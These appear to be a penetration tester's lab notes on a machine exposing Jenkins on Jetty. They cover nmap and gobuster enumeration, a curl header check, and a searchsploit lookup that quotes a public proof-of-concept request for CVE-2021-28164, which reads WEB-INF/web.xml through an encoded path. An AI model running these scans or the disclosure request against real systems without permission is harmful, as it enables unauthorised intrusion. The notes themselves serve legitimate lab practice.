# nmap
### nmap scan 1: quick, all ports 
```
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -Pn --open 10.129.168.243                                                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 06:33 MDT
Nmap scan report for 10.129.168.243
Host is up (0.067s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
               
```

### nmap scan 2: service version
```
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -sV -sC -p 8080 10.129.168.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 06:34 MDT
Nmap scan report for 10.129.168.243
Host is up (0.048s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.39.v20210325)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds

```

### nmap - checking for any jenkins nmap scripts
```
┌──(kali㉿kali)-[~]
└─$ ls -l /usr/share/nmap/scripts | grep jenk 
-rw-r--r-- 1 root root  3184 May 15 09:37 broadcast-jenkins-discover.nse
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap --script-help broadcast-jenkins-discover.nse
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 06:45 MDT

broadcast-jenkins-discover
Categories: discovery broadcast safe
https://nmap.org/nsedoc/scripts/broadcast-jenkins-discover.html
  Discovers Jenkins servers on a LAN by sending a discovery broadcast probe.

  For more information about Jenkins auto discovery, see:
  * https://wiki.jenkins.io/display/JENKINS/Auto-discovering+Jenkins+on+the+network

```

# Gobuster
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.129.168.243:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x html  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.168.243:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://10.129.168.243:8080/7ad6cf3d-471c-484a-92e4-90f86ce1fbc6 => 403 (Length: 613). To continue please exclude the status code or the length

```

# Curl
```
┌──(kali㉿kali)-[~]
└─$ curl -I 10.129.168.243:8080
HTTP/1.1 403 Forbidden
Date: Fri, 15 Aug 2025 12:43:49 GMT
X-Content-Type-Options: nosniff
Set-Cookie: JSESSIONID.8daf3d32=node0k4e3gg5p2jr716igqfe9vm04e34.node0; Path=/; HttpOnly
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html;charset=utf-8
X-Hudson: 1.395
X-Jenkins: 2.289.1
X-Jenkins-Session: f3209ae6
Content-Length: 541
Server: Jetty(9.4.39.v20210325)

```

# Searchsploit
### Potentially incorrect version
```
┌──(kali㉿kali)-[~]
└─$ searchsploit Jetty 9.4   
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Jetty 9.4.37.v20210219 - Information Disclosure                                                                            | java/webapps/50438.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/java/webapps/50438.txt
# Exploit Title: Jetty 9.4.37.v20210219 - Information Disclosure
# Date: 2021-10-21
# Exploit Author: Mayank Deshmukh
# Vendor Homepage: https://www.eclipse.org/jetty/
# Software Link: https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-distribution/9.4.37.v20210219/
# Version: 9.4.37.v20210219 and 9.4.38.v20210224
# Tested on: Kali Linux
# CVE : CVE-2021-28164

POC #1 - web.xml

GET /%2e/WEB-INF/web.xml HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0 
```